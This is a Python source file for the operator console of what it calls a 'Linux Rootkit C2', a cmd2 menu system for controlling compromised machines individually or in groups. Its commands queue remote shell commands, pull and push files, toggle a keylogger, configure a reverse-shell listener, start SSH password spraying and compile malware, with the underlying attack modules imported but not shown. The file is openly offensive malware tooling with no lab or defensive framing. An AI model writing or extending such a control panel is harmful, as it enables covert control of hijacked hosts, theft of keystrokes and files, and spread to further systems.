import cmd2
from cmd2 import bg, fg, style
import cmd2_submenu
from addcommand import editcommand
from getoutput import getoutput
from downloadfile import downloadfile
from uploadfile import uploadfile
from keylogger import keylogger
from toggleshell import toggleshell
from updategroup import updategroup
from sshspray import sshspray
from compilemalware import compilemalware
from groupcommands import groupcommands

class GroupCommandsMenu(cmd2.Cmd):
        GROUP_COMMANDS_CATEGORY = 'Group Post Exploitation Commands'
        def __init__(self):
                super().__init__(multiline_commands=['command'], persistent_history_file='cmd2_history.dat', use_ipython=True)

                self.intro = style("Welcome to the Group Commands Menu!", fg=fg.red, bg=bg.white, bold=True)

                self.self_in_py = True

                self.prompt = '(post-exploit > group-commands) > '

        @cmd2.with_category(GROUP_COMMANDS_CATEGORY)
        def do_command(self, arg):
                """[group_id] [command]"""
                self.poutput("[*] Setting group command..." + arg.split()[0] + " " + arg.split()[1])
                retValue = groupcommands(1, arg.split()[0], arg.split()[1])

                if (retValue):
                        self.poutput("[+] Successfully set group command!")
                else:
                        self.poutput("[-] Error setting group command")

        @cmd2.with_category(GROUP_COMMANDS_CATEGORY)
        def do_download(self, arg):
                """[group_id] [nameOfRemoteFile] [saveAsLocalPath]"""
                self.poutput("[*] Requesting group download..." + arg.split()[0] + " " + arg.split()[1] + arg.split()[2])
                retValue = groupcommands(2, arg.split()[0], arg.split()[1], arg.split()[2])

                if (retValue):
                        self.poutput("[+] Successfully set group command!")
                else:
                        self.poutput("[-] Error setting group command")

        @cmd2.with_category(GROUP_COMMANDS_CATEGORY)
        def do_upload(self, arg):
                """[group_id] [nameOfLocalFile] [saveAsRemotePath]"""
                self.poutput("[*] Requesting group upload..." + arg.split()[0] + " " + arg.split()[1] + arg.split()[2]) 
                retValue = groupcommands(3, arg.split()[0], arg.split()[1], arg.split()[2])

                if (retValue):
                        self.poutput("[+] Successfully set group command!")
                else:
                        self.poutput("[-] Error setting group command")

        @cmd2.with_category(GROUP_COMMANDS_CATEGORY)
        def do_keylog(self, arg):
                """[group_id] [keylogBoolean]"""
                self.poutput("[*] Setting group keylog status..." + arg.split()[0] + " " + arg.split()[1])
                retValue = groupcommands(4, arg.split()[0], arg.split()[1])

                if (retValue):
                        self.poutput("[+] Successfully set group command!")
                else:
                        self.poutput("[-] Error setting group command")


@cmd2_submenu.AddSubmenu(GroupCommandsMenu(), command='group-commands', reformat_prompt="{super_prompt[0]}{super_prompt[1]}{super_prompt[2]}{super_prompt[3]}{super_prompt[4]}{super_prompt[5]} {sub_prompt}")
class PostExploitMenu(cmd2.Cmd):
        POST_EXPLOIT_CATEGORY = 'Post Exploitation Commands'
        def __init__(self):
                super().__init__(multiline_commands=['command'], persistent_history_file='cmd2_history.dat', use_ipython=True)

                self.intro = style("Welcome to the Post Exploitation Menu!", fg=fg.red, bg=bg.white, bold=True)

                self.self_in_py = True

                self.prompt = '(post-exploit) > '

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_intro(self, _):
                self.poutput(self.intro)

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_command(self, arg):
                """[machine_id] [command]"""
                self.poutput("[*] Setting command in Cookie..." + arg.split(" ", 1)[0] + " " + arg.split(" ", 1)[1])
                retValue = editcommand(arg.split(" ", 1)[0], arg.split(" ", 1)[1])

                if (retValue):
                        self.poutput("[+] Successfully set command in Cookie!")
                else:
                        self.poutput("[-] Error setting command in Cookie")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_download(self, arg):
                """[machine_id] [nameOfRemoteFile] [saveAsLocalPath]"""
                self.poutput("[*] Adding download request to machine..." + arg.split()[0] + " " + arg.split()[1] + arg.split()[2])
                retValue = downloadfile(arg.split()[0], arg.split()[1], arg.split()[2])

                if (retValue):
                        self.poutput("[+] Successfully added command to the queue")
                else:
                        self.poutput("[-] Error adding command to the queue")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_upload(self, arg):
                """[machine_id] [nameOfLocalFile] [saveAsRemotePath]"""
                self.poutput("[*] Adding upload request to machine..." + arg.split()[0] + " " + arg.split()[1] + arg.split()[2])
                retValue = uploadfile(arg.split()[0], arg.split()[1], arg.split()[2])

                if (retValue):
                        self.poutput("[+] Successfully added command to the queue")
                else:
                        self.poutput("[-] Error adding command to the queue")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_keylog(self, arg):
                """[machine_id] [keylogBoolean]"""
                self.poutput("[*] Modifying keylog status..." + arg.split(" ", 1)[0] + " " + arg.split(" ", 1)[1])
                retValue = keylogger(arg.split(" ", 1)[0], arg.split(" ", 1)[1])

                if (retValue):
                        self.poutput("[+] Successfully updated keylogger status!")
                else:
                        self.poutput("[-] Error modifying keylogger status")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_output(self, arg):
                """[machine_id]"""
                self.poutput("[*] Getting Output for Machine..." + arg.split(" ", 1)[0])
                retValue = getoutput(arg.split(" ", 1)[0])

                if (not retValue):
                        self.poutput("[-] Error getting output for that machine")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_shell(self, arg):
                """[machine_id] [ip] [port]"""
                self.poutput("[*] Setting Port for Shell Listener..." + arg.split()[0] + " " + arg.split()[1] + " " + arg.split()[2])
                retValue = toggleshell(arg.split()[0], arg.split()[1], arg.split()[2])

                if (retValue):
                        self.poutput("[+] Successfully updated listening port!")
                else:
                        self.poutput("[-] Error updating shell listener")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_updategroup(self, arg):
                """[machine_id] [new group_id]"""
                self.poutput("[*] Updating group_id for given machine..." + arg.split()[0] + " " + arg.split()[1])
                retValue = updategroup(arg.split()[0], arg.split()[1])

                if (retValue):
                        self.poutput("[+] Successfully updated group id!")
                else:
                        self.poutput("[-] Error updating group id")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_sshspray(self, arg):
                """[machine_id] [sshspray_value]"""
                self.poutput("[*] Modifying sshspray status..." + arg.split()[0] + " " + arg.split()[1])
                retValue = sshspray(arg.split()[0], arg.split()[1])

                if (retValue):
                        self.poutput("[+] Successfully updated sshspray status!")
                else:
                        self.poutput("[-] Error modifying sshspray status")

        @cmd2.with_category(POST_EXPLOIT_CATEGORY)
        def do_compilemalware(self, arg):
                """[machine_id] [time_interval]"""
                compilemalware(arg.split()[0], arg.split()[1])

@cmd2_submenu.AddSubmenu(PostExploitMenu(), command='post-exploit', reformat_prompt="{super_prompt[0]}{super_prompt[1]}{super_prompt[2]}{super_prompt[3]}{super_prompt[4]}{super_prompt[5]} {sub_prompt}")
class TopLevel(cmd2.Cmd):
        CUSTOM_CATEGORY = 'My Custom Commands'

        def __init__(self):
                super().__init__(multiline_commands=['echo'], persistent_history_file='cmd2_history.dat', use_ipython=True)

                self.intro = style("Welcome to the Linux Rootkit C2!", fg=fg.red, bg=bg.white, bold=True)

                self.self_in_py = True

                self.prompt = 'J.O.B. > '

                #self.default_category = 'cmd2 Built-in Commands'

        @cmd2.with_category(CUSTOM_CATEGORY)
        def do_intro(self, _):
                self.poutput(self.intro)

        @cmd2.with_category(CUSTOM_CATEGORY)
        def do_echo(self, arg):
                self.poutput(arg)


if __name__ == '__main__':
        app = TopLevel()
        app.cmdloop()
